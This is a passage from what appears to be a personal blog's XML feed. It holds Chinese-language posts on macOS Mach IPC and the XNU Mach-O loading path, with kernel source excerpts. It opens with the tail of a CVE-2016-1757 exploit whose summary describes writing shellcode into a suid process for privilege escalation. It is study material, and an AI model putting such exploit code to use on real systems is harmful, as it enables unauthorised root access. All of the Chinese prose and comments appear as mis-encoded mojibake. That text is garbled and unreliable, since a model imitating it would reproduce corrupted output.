(err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"can't register service port"</span>, err);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"[+] registered service \"%s\" with launchd to receive child thread port\n"</span>, service_name);</div><div class="line"></div><div class="line">  <span class="comment">// fork a child</span></div><div class="line">  <span class="comment">//forkå­è¿›ç¨‹ï¼Œåšå‡ºåˆ¤æ–­å†³å®šè°ƒç”¨å“ªä¸ªå‡½æ•°</span></div><div class="line">  <span class="keyword">pid_t</span> child_pid = fork();</div><div class="line">  <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</div><div class="line">    do_child();</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    do_parent(service_port);</div><div class="line">    <span class="keyword">int</span> status;</div><div class="line">    wait(&amp;status);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹å‡ºä¸»è¦æœ‰ä¸‰ä¸ªå‡½æ•°:</p>
<ol>
<li>do_parentâ€“æ ¹æ®å­è¿›ç¨‹å‘é€çš„portåˆ¤æ–­æ˜¯å¦ä¸ºsuidè¿›ç¨‹ï¼Œå¹¶å¯¹å­è¿›ç¨‹è¿›è¡Œå›åº”åæ‰¾åˆ°å¯¹åº”ç‚¹å†™å…¥è¡Œshellcode</li>
<li>do_childâ€“å°†è‡ªå·±çš„portå‘é€ç»™çˆ¶è¿›ç¨‹ï¼Œå¾—åˆ°çˆ¶è¿›ç¨‹çš„å›åº”åæ‰§è¡Œsuidè¿›ç¨‹</li>
<li>mainâ€“åˆ›å»ºäº†portä¹‹åforkå‡ºå­ç¨‹åºï¼Œæ ¹æ®ä¸åŒçš„å‡½æ•°åšä¸åŒçš„äº‹</li>
</ol>
<p>é€šè¿‡å¯¹ä»¥ä¸Šæ¼æ´åˆ†æï¼Œæˆ‘ä»¬å·©å›ºäº†ä¸€äº›åŸºç¡€çŸ¥è¯†:</p>
<ul>
<li><code>mach_msg()</code></li>
<li><code>mach_port_right</code></li>
<li><code>mach_vm_*</code></li>
</ul>
<p>ä»¥ä¸Šåˆ†æåªæ˜¯ç”¨åˆ°äº†ipcç”¨æˆ·æ€çš„ä¸€äº›çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥å¯ä»¥é€šè¿‡åˆ†æå…¶ä»–æœ‰å…³mach_portsçš„æ¼æ´æ¥è¿›è¡Œä¸€ä¸ªipcçš„æ·±å…¥ç†è§£</p>
<p>å‚è€ƒ:ã€Šæ·±å…¥è§£æOSX&amp;iOSæ“ä½œç³»ç»Ÿã€‹<br><a href="https://jaq.alibaba.com/community/art/show?articleid=687" target="_blank" rel="external">é»‘äº‘å‹åŸåŸæ¬²æ‘§-2016å¹´iOSå…¬å¼€å¯ä»¥ç”¨æ¼æ´æ€»ç»“</a><br><a href="https://jaq.alibaba.com/community/art/show?articleid=687" target="_blank" rel="external">CVE-2016-1757ç®€å•åˆ†æ](http://turingh.github.io/2016/04/03/CVE-2016-1757ç®€å•åˆ†æ/#3-3_do_parent)</a></p>
]]></content>
      
        
        <tags>
            
            <tag> OSX </tag>
            
            <tag> Mach </tag>
            
            <tag> IPC </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mach-OåŠ è½½æµç¨‹]]></title>
      <url>http://Hello-Sherlock.github.io/2017/01/04/six-Blog/</url>
      <content type="html"><![CDATA[<blockquote>
<p>äº†è§£äº†<a href="https://hello-sherlock.github.io/2016/12/06/three-Blog/">Mach-Oçš„æ–‡ä»¶æ ¼å¼</a>ï¼Œè‚¯å®šéœ€è¦äº†è§£Mach-Oçš„åŠ è½½æµç¨‹ï¼Œæ—¢ç„¶è¦ç ”ç©¶OSXï¼Œè¿™å°±æ˜¯å¿…ä¸å¯å°‘çš„ä¸€æ­¥ï¼Œé‚£ä¹ˆé€šè¿‡é˜…è¯»æºç å¯ä»¥æ¯”è¾ƒæ¸…æ™°çš„è®¤è¯†è¿™ä¸€æµç¨‹<br>ç”¨æˆ·æ€åœ¨åŠ è½½æ–°çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ä¼šæœ‰ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡<code>exec*</code>ç³»åˆ—å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»<code>exec*</code>è¯´èµ·ï¼Œç”±äºexec*æ˜¯éƒ½åªæ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨execve()åº“çš„å°è£…ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»ä¸€å¼ æµç¨‹å›¾æ¥çœ‹èµ·</p>
</blockquote>
<a id="more"></a>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20170304-185855@2x.jpg" alt="QQ20170304-185855@2x.jpg"></p>
<h3 id="1-1-mac-execve"><a href="#1-1-mac-execve" class="headerlink" title="1.1__mac_execve()"></a>1.1<code>__mac_execve()</code></h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span></div><div class="line">__mac_execve(proc_t p, <span class="class"><span class="keyword">struct</span> <span class="title">__mac_execve_args</span></span> *uap, int32_t *retval)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> *bufp = NULL; </div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">image_params</span></span> *imgp;</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">	context.vc_thread = current_thread();</div><div class="line">	context.vc_ucred = kauth_cred_proc_ref(p);	<span class="comment">/* XXX must NOT be kauth_cred_get() */</span></div><div class="line"></div><div class="line">	<span class="comment">/* Allocate a big chunk for locals instead of using stack since these  </span></div><div class="line">	 * structures a pretty big.</div><div class="line">	 */</div><div class="line">	 <span class="comment">//ç”³è¯·ä¸€å—å†…å­˜ç”¨æ¥å­˜æ”¾imgp,vap,origavpçš„æ•°æ®ç»“æ„</span></div><div class="line">	MALLOC(bufp, <span class="keyword">char</span> *, (<span class="keyword">sizeof</span>(*imgp) + <span class="keyword">sizeof</span>(*vap) + <span class="keyword">sizeof</span>(*origvap)), M_TEMP, M_WAITOK | M_ZERO);</div><div class="line">	imgp = (<span class="class"><span class="keyword">struct</span> <span class="title">image_params</span></span> *) bufp;</div><div class="line">	<span class="keyword">if</span> (bufp == NULL) &#123;</div><div class="line">		error = ENOMEM;</div><div class="line">		goto exit_with_error;</div><div class="line">	&#125;</div><div class="line">	vap = (<span class="class"><span class="keyword">struct</span> <span class="title">vnode_attr</span></span> *) (bufp + <span class="keyword">sizeof</span>(*imgp));</div><div class="line">	origvap = (<span class="class"><span class="keyword">struct</span> <span class="title">vnode_attr</span></span> *) (bufp + <span class="keyword">sizeof</span>(*imgp) + <span class="keyword">sizeof</span>(*vap));</div><div class="line">	<span class="comment">//åˆå§‹åŒ–imgp</span></div><div class="line">	<span class="comment">/* Initialize the common data in the image_params structure */</span></div><div class="line">	imgp-&gt;ip_user_fname = uap-&gt;fname;</div><div class="line">	imgp-&gt;ip_user_argv = uap-&gt;argp;</div><div class="line">	imgp-&gt;ip_user_envv = uap-&gt;envp;</div><div class="line">	imgp-&gt;ip_vattr = vap;</div><div class="line">	imgp-&gt;ip_origvattr = origvap;</div><div class="line">	imgp-&gt;ip_vfs_context = &amp;context;</div><div class="line">	imgp-&gt;ip_flags = (is_64 ? IMGPF_WAS_64BIT : IMGPF_NONE) | ((p-&gt;p_flag &amp; P_DISABLE_ASLR) ? IMGPF_DISABLE_ASLR : IMGPF_NONE);</div><div class="line">	imgp-&gt;ip_seg = (is_64 ? UIO_USERSPACE64 : UIO_USERSPACE32);</div><div class="line">	imgp-&gt;ip_mac_return = <span class="number">0</span>;</div><div class="line"></div><div class="line">	uthread = get_bsdthread_info(current_thread());</div><div class="line">	<span class="keyword">if</span> (uthread-&gt;uu_flag &amp; UT_VFORK) &#123;</div><div class="line">		imgp-&gt;ip_flags |= IMGPF_VFORK_EXEC;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">#<span class="keyword">if</span> CONFIG_MACF</div><div class="line">	<span class="keyword">if</span> (uap-&gt;mac_p != USER_ADDR_NULL) &#123;</div><div class="line">		error = mac_execve_enter(uap-&gt;mac_p, imgp);</div><div class="line">		<span class="keyword">if</span> (error) &#123;</div><div class="line">			kauth_cred_unref(&amp;context.vc_ucred);</div><div class="line">			goto exit_with_error;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">#endif</div><div class="line"><span class="comment">//æ‰§è¡Œimageå‡½æ•°</span></div><div class="line">	error = exec_activate_image(imgp);</div><div class="line">	</div><div class="line"><span class="comment">//é‡Šæ”¾èµ„æº</span></div><div class="line">	kauth_cred_unref(&amp;context.vc_ucred);</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">	<span class="keyword">return</span>(error);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>ä¸»è¦åŠ è½½é•œåƒè¿›è¡Œæ•°æ®çš„åˆå§‹åŒ–ä»¥åŠèµ„æºçš„ç›¸å…³æ“ä½œï¼Œå…·ä½“çš„å®¶åœ¨æµç¨‹åœ¨<code>exec_activate_image())</code>ä¸­</li>
</ul>
<h3 id="1-2exec-activate-image"><a href="#1-2exec-activate-image" class="headerlink" title="1.2exec_activate_image()"></a>1.2<code>exec_activate_image()</code></h3><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span></div><div class="line">exec_activate_image(struct image_params *imgp)</div><div class="line">&#123;</div><div class="line">	struct nameidata *ndp = <span class="keyword">NULL</span>;</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *excpath;</div><div class="line">	<span class="keyword">int</span> error;</div><div class="line">	<span class="keyword">int</span> resid;</div><div class="line">	<span class="keyword">int</span> once = <span class="number">1</span>;	<span class="comment">/* save SGUID-ness for interpreted files */</span></div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	<span class="keyword">int</span> itercount = <span class="number">0</span>;</div><div class="line">	proc_t p = vfs_context_proc(imgp-&gt;ip_vfs_context);</div><div class="line"></div><div class="line">	error = execargs_alloc(imgp);</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		<span class="keyword">goto</span> bad_notrans;</div><div class="line">	<span class="comment">//ä¿å­˜ç¨‹åºè·¯å¾„</span></div><div class="line">	error = exec_save_path(imgp, imgp-&gt;ip_user_fname, imgp-&gt;ip_seg, &amp;excpath);</div><div class="line">	<span class="keyword">if</span> (error) &#123;</div><div class="line">		<span class="keyword">goto</span> bad_notrans;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/* Use excpath, which contains the copyin-ed exec path */</span></div><div class="line">	DTRACE_PROC1(exec, uintptr_t, excpath);</div><div class="line"></div><div class="line">	MALLOC(ndp, struct nameidata *, sizeof(*ndp), M_TEMP, M_WAITOK | M_ZERO);</div><div class="line">	<span class="keyword">if</span> (ndp == <span class="keyword">NULL</span>) &#123;</div><div class="line">		error = ENOMEM;</div><div class="line">		<span class="keyword">goto</span> bad_notrans;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF | AUDITVNPATH1,</div><div class="line">		   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</div><div class="line"></div><div class="line">again:</div><div class="line">	error = namei(ndp);</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		<span class="keyword">goto</span> bad_notrans;</div><div class="line">	imgp-&gt;ip_ndp = ndp;	<span class="comment">/* successful namei(); call nameidone() later */</span></div><div class="line">	imgp-&gt;ip_vp = ndp-&gt;ni_vp;	<span class="comment">/* if set, need to vnode_put() at some point */</span></div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Before we start the transition from binary A to binary B, make</div><div class="line">	 * sure another thread hasn't started exiting the process.  We grab</div><div class="line">	 * the proc lock to check p_lflag initially, and the transition</div><div class="line">	 * mechanism ensures that the value doesn't change after we release</div><div class="line">	 * the lock.</div><div class="line">	 */</div><div class="line">	proc_lock(p);</div><div class="line">	<span class="keyword">if</span> (p-&gt;p_lflag &amp; P_LEXIT) &#123;</div><div class="line">		error = EDEADLK;</div><div class="line">		proc_unlock(p);</div><div class="line">		<span class="keyword">goto</span> bad_notrans;</div><div class="line">	&#125;</div><div class="line">	error = proc_transstart(p, <span class="number">1</span>, <span class="number">0</span>);</div><div class="line">	proc_unlock(p);</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		<span class="keyword">goto</span> bad_notrans;</div><div class="line"></div><div class="line">	error = exec_check_permissions(imgp);</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		<span class="keyword">goto</span> bad;</div><div class="line"></div><div class="line">	<span class="comment">/* Copy; avoid invocation of an interpreter overwriting the original */</span></div><div class="line">	<span class="keyword">if</span> (once) &#123;</div><div class="line">		once = <span class="number">0</span>;</div><div class="line">		*imgp-&gt;ip_origvattr = *imgp-&gt;ip_vattr;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	error = vn_rdwr(UIO_READ, imgp-&gt;ip_vp, imgp-&gt;ip_vdata, PAGE_SIZE, <span class="number">0</span>,</div><div class="line">			UIO_SYSSPACE, IO_NODELOCKED,</div><div class="line">			vfs_context_ucred(imgp-&gt;ip_vfs_context),</div><div class="line">			&amp;resid, vfs_context_proc(imgp-&gt;ip_vfs_context));</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		<span class="keyword">goto</span> bad;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (resid) &#123;</div><div class="line">		memset(imgp-&gt;ip_vdata + (PAGE_SIZE - resid), <span class="number">0x0</span>, resid);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">encapsulated_binary:</div><div class="line">	<span class="comment">/* Limit the number of iterations we will attempt on each binary */</span></div><div class="line">	<span class="keyword">if</span> (++itercount &gt; EAI_ITERLIMIT) &#123;</div><div class="line">	    	error = EBADEXEC;</div><div class="line">		<span class="keyword">goto</span> bad;</div><div class="line">	&#125;</div><div class="line">	error = <span class="number">-1</span>;</div><div class="line"><span class="comment">//éå†execswæ¥ç¡®å®šä¸åŒçš„åŠ è½½å‡½æ•°</span></div><div class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; error == <span class="number">-1</span> &amp;&amp; execsw[i].ex_imgact != <span class="keyword">NULL</span>; i++) &#123;</div><div class="line"></div><div class="line">		error = (*execsw[i].ex_imgact)(imgp);</div><div class="line"></div><div class="line">		<span class="keyword">switch</span> (error) &#123;</div><div class="line">		<span class="comment">/* case -1: not claimed: continue */</span></div><div class="line">		<span class="keyword">case</span> <span class="number">-2</span>:		<span class="comment">/* Encapsulated binary, imgp-&gt;ip_XXX set for next iteration */</span></div><div class="line">			<span class="keyword">goto</span> encapsulated_binary;</div><div class="line">                   		<span class="keyword">case</span> <span class="number">-3</span>:		<span class="comment">/* Interpreter */</span></div><div class="line"><span class="comment">#if CONFIG_MACF</span></div><div class="line">			<span class="comment">/*</span></div><div class="line">			 * Copy the script label for later use. Note that</div><div class="line">			 * the label can be different when the script is</div><div class="line">			 * actually read by the interpreter.</div><div class="line">			 */</div><div class="line">			<span class="keyword">if</span> (imgp-&gt;ip_scriptlabelp)</div><div class="line">				mac_vnode_label_free(imgp-&gt;ip_scriptlabelp);</div><div class="line">			imgp-&gt;ip_scriptlabelp = mac_vnode_label_alloc();</div><div class="line">			<span class="keyword">if</span> (imgp-&gt;ip_scriptlabelp == <span class="keyword">NULL</span>) &#123;</div><div class="line">				error = ENOMEM;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line">			mac_vnode_label_copy(imgp-&gt;ip_vp-&gt;v_label,</div><div class="line">					     imgp-&gt;ip_scriptlabelp);</div><div class="line"></div><div class="line">			<span class="comment">/*</span></div><div class="line">			 * Take a ref of the script vnode for later use.</div><div class="line">			 */</div><div class="line">			<span class="keyword">if</span> (imgp-&gt;ip_scriptvp)</div><div class="line">				vnode_put(imgp-&gt;ip_scriptvp);</div><div class="line">			<span class="keyword">if</span> (vnode_getwithref(imgp-&gt;ip_vp) == <span class="number">0</span>)</div><div class="line">				imgp-&gt;ip_scriptvp = imgp-&gt;ip_vp;</div><div class="line"><span class="comment">#endif</span></div><div class="line"></div><div class="line">			nameidone(ndp);</div><div class="line"></div><div class="line">			vnode_put(imgp-&gt;ip_vp);</div><div class="line">			imgp-&gt;ip_vp = <span class="keyword">NULL</span>;	<span class="comment">/* already put */</span></div><div class="line">			imgp-&gt;ip_ndp = <span class="keyword">NULL</span>; <span class="comment">/* already nameidone */</span></div><div class="line"></div><div class="line">			<span class="comment">/* Use excpath, which exec_shell_imgact reset to the interpreter */</span></div><div class="line">			NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF,</div><div class="line">				   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</div><div class="line"></div><div class="line">			proc_transend(p, <span class="number">0</span>);</div><div class="line">			<span class="keyword">goto</span> again;</div><div class="line"></div><div class="line">		<span class="keyword">default</span>:</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Call out to allow 3rd party notification of exec. </div><div class="line">	 * Ignore result of kauth_authorize_fileop call.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> &amp;&amp; kauth_authorize_fileop_has_listeners()) &#123;</div><div class="line">		kauth_authorize_fileop(vfs_context_ucred(imgp-&gt;ip_vfs_context),</div><div class="line">					KAUTH_FILEOP_EXEC,</div><div class="line">					(uintptr_t)ndp-&gt;ni_vp, <span class="number">0</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (error == <span class="number">0</span>) &#123;</div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * Reset atm context from task</div><div class="line">		 */</div><div class="line">		task_atm_reset(p-&gt;task);</div><div class="line"></div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * Reset old bank context from task</div><div class="line">		 */</div><div class="line">		task_bank_reset(p-&gt;task);</div><div class="line">	&#125;</div><div class="line">bad:</div><div class="line">	proc_transend(p, <span class="number">0</span>);</div><div class="line"></div><div class="line">bad_notrans:</div><div class="line">	<span class="keyword">if</span> (imgp-&gt;ip_strings)</div><div class="line">		execargs_free(imgp);</div><div class="line">	<span class="keyword">if</span> (imgp-&gt;ip_ndp)</div><div class="line">		nameidone(imgp-&gt;ip_ndp);</div><div class="line">	<span class="keyword">if</span> (ndp)</div><div class="line">		FREE(ndp, M_TEMP);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> (error);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>exec_activate_image()å®Œæˆäº†é•œåƒåŠ è½½çš„æ‰€æœ‰å·¥ä½œï¼Œä¸»è¦æ˜¯å¯»æ‰¾å¯æ‰§è¡Œæ–‡ä»¶å¹¶æŠŠä»–ä»¬æ‹·è´åœ¨å†…å­˜ä¸­ï¼Œé€šè¿‡éå†execswï¼Œæ ¹æ®å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸åŒç±»å‹æ¥ç¡®å®šä¸åŒçš„åŠ è½½å‡½æ•°ï¼Œä»<code>if(error)</code>å¯ä»¥çœ‹å‡ºè¿™äº›åŠ è½½è¿‡ç¨‹å¦‚æœä¸æ˜¯è¢«ç»ˆæ­¢å°±æ˜¯å®Œæˆåœ¨æ•´ä¸ªæµç¨‹çš„åŠ è½½</li>
</ul>
<h3 id="1-3-exec-mach-imgact"><a href="#1-3-exec-mach-imgact" class="headerlink" title="1.3 exec_mach_imgact"></a>1.3 <code>exec_mach_imgact</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> execsw &#123;</div><div class="line">	<span class="keyword">int</span> (*ex_imgact)(<span class="keyword">struct</span> image_params *);</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *ex_name;</div><div class="line">&#125; execsw[] = &#123;</div><div class="line">	&#123; exec_mach_imgact,		<span class="string">"Mach-o Binary"</span> &#125;,</div><div class="line">	&#123; exec_fat_imgact,		<span class="string">"Fat Binary"</span> &#125;,</div><div class="line">	&#123; exec_shell_imgact,		<span class="string">"Interpreter Script"</span> &#125;,</div><div class="line">	&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>å¯ä»¥çœ‹å‡ºï¼ŒOSXæœ‰ä¸‰ç§å¯æ‰§è¡Œæ–‡ä»¶:</li>
</ul>
<ol>
<li>Mach-oç”±exec_mach_imgactå¤„ç†</li>
<li>Fat Binaryç”±exec_fat_imgactå¤„ç†</li>
<li>Interpreter Scriptç”±exec_shell_imgactå¤„ç†</li>
</ol>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div 